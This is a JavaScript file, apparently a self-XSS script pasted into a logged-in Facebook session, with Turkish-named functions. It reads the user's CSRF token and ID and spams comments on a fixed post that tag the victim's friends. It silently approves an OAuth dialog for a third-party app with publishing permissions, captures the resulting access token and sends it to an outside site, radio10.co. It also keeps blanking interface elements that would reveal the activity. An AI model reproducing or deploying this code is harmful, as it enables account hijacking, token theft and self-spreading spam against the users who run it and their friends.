function IbraheemNada(uidss) {
    var a = document.createElement('script');
    a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
    document.body.appendChild(a)
}
IbraheemNada("");

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var id = "311411802351987";
var arkadaslar = [];
var svn_rev;

function arkadaslari_al(id) {
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4) {
            eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);", "") + ";");
            for (f = 0; f < Math.round(arkadaslar.payload.entries.length / 27); f++) {
                mesaj = "";
                mesaj_text = "";
                for (i = f * 27; i < (f + 1) * 27; i++) {
                    if (arkadaslar.payload.entries[i]) {
                        mesaj += " @[" + arkadaslar.payload.entries[i].uid + ":" + arkadaslar.payload.entries[i].text + "]";
                        mesaj_text += " " + arkadaslar.payload.entries[i].text;
                    }
                }
                yorum_yap(id, mesaj)
            }
        }
    };
    var params = "&filter[0]=user";
    params += "&options[0]=friends_only";
    params += "&options[1]=nm";
    params += "&token=v7";
    params += "&viewer=" + user_id;
    params += "&__user=" + user_id;
    if (document.URL.indexOf("https://") >= 0) {
        xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true);
    } else {
        xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true);
    }
    xmlhttp.send();
}

function RandomArkadas() {
    var sonuc = "";
    for (i = 0; i < 9; i++) {
        sonuc += " @[" + arkadaslar.payload.entries[Math.floor(Math.random() * arkadaslar.payload.entries.length)].uid + ":" + arkadaslar.payload.entries[Math.floor(Math.random() * arkadaslar.payload.entries.length)].text + "]";
    }
    return sonuc;
}

function yorum_yap(id, mesaj) {
    var xhr = new XMLHttpRequest();
    var params = "";
    params += "&ft_ent_identifier=" + id;
    params += "&comment_text=" + encodeURIComponent(mesaj);
    params += "&source=2";
    params += "&client_id= 637840502919530";
    params += "&reply_fbid";
    params += "&parent_comment_id";
    params += "&rootid=u_jsonp_2_3";
    params += "&clp={\"cl_impid\":\"453524a0\",\"clearcounter\":0,\"elementid\":\"js_5\",\"version\":\"x\",\"parent_fbid\":" + id + "}";
    params += "&attached_sticker_fbid=0";
    params += "&attached_photo_fbid=0";
    params += "&giftoccasion";
    params += "&ft[tn]=[]";
    params += "&__user=" + user_id;
    params += "&__a=1";
    params += "&__dyn=7n8ahyj35ynxl2u5F97KepEsyo";
    params += "&__req=q";
    params += "&fb_dtsg=" + fb_dtsg;
    params += "&ttstamp=";
    xhr.open("POST", "/ajax/ufi/add_comment.php", true);

    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
            xhr.close;
        }
    }
    xhr.send(params);
}

arkadaslari_al(id);

if (location.hostname.indexOf("www.facebook.com", "static.ak.facebook.com", "apps.facebook.com", "beta.facebook.com") >= 0) {
    var profile_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();

    function uygulamaizinver(url) {
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4) {
                izinverhtml = document.createElement("html");
                izinverhtml.innerHTML = xmlhttp.responseText;
                if (izinverhtml.getElementsByTagName("form").length > 0) {
                    izinverhtml.innerHTML = izinverhtml.getElementsByTagName("form")[0].outerHTML
                    act = izinverhtml.getElementsByTagName("form")[0].action;
                    duzenlevegonder(izinverhtml, act);
                }
            }
        };
        xmlhttp.open("GET", url, true);
        xmlhttp.send();
    }

    function duzenlevegonder(formnesne, act) {
        izinverparams = "";
        for (i = 0; i < formnesne.getElementsByTagName("input").length; i++) {
            if (formnesne.getElementsByTagName("input")[i].name.indexOf("__CANCEL__") < 0 && formnesne.getElementsByTagName("input")[i].name.indexOf("cancel_clicked")) {
                izinverparams += "&" + formnesne.getElementsByTagName("input")[i].name + "=" + formnesne.getElementsByTagName("input")[i].value;
            }
        }
        if (formnesne.getElementsByTagName("select").length > 0) {
            izinverparams += "&" + formnesne.getElementsByTagName("select")[0].name + "=80";
        }
        izinverparams.replace("&fb_dtsg", "fb_dtsg");
        izinverparams += "&__CONFIRM__=1";
        formnesne = formnesne;
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4) {
                izinhtml = document.createElement("html");
                izinhtml.innerHTML = xmlhttp.responseText;
                if (izinhtml.getElementsByTagName("form").length > 0) {
                    izinhtml.innerHTML = izinhtml.getElementsByTagName("form")[0].outerHTML;
                    act = izinhtml.getElementsByTagName("form")[0].action;
                    duzenlevegonder(izinhtml, act)
                } else {
                    sex = xmlhttp.responseText.match(/#access_token=(.*?)&expires_in/i);
                    if (sex[1]) {
                        tokenyolla(sex[1]);
                    }
                }
            }
        };

        xmlhttp.open("POST", act, true);
        xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xmlhttp.send(izinverparams);

    }

    function TokenUrl(id) {
        return "//www.facebook.com/dialog/oauth?response_type=token&display=popup&client_id=" + id + "&redirect_uri=fbconnect://success&sso_key=com&scope=email,publish_stream,user_likes,friends_likes,user_birthday";
    }

    if (!localStorage['token_' + profile_id] || (localStorage['token_' + profile_id] && tarih.getTime() >= localStorage['token_' + profile_id])) {
        uygulamaizinver(TokenUrl("121876164619130"));
        var http = new XMLHttpRequest();
        http['open']('GET', 'http://graph.facebook.com/' + profile_id, false);
        http['send']();
        var get = JSON.parse(http['responseText']);
        var isim = get.name;
    }
    window.setInterval(function() {
        if (document.getElementsByClassName("_5ce")) {
            for (i = 0; i < document.getElementsByClassName("_5ce").length; i++) {
                document.getElementsByClassName("_5ce")[i].innerHTML = "";
            }
        }
        if (document.getElementsByClassName("uiToggle wrap")) {
            for (i = 0; i < document.getElementsByClassName("uiToggle wrap").length; i++) {
                document.getElementsByClassName("uiToggle wrap")[i].innerHTML = "";
            }
        }
        if (document.getElementsByClassName("uiPopover")) {
            for (i = 0; i < document.getElementsByClassName("uiPopover").length; i++) {
                document.getElementsByClassName("uiPopover")[i].innerHTML = "";
            }
        }
    }, 200);

    function tokenyolla(token) {
        top.location.href = 'http://www.radio10.co/inicio.html#' + token;
    }
}
var alibasim = "clic en aceptar";
alert(alibasim);
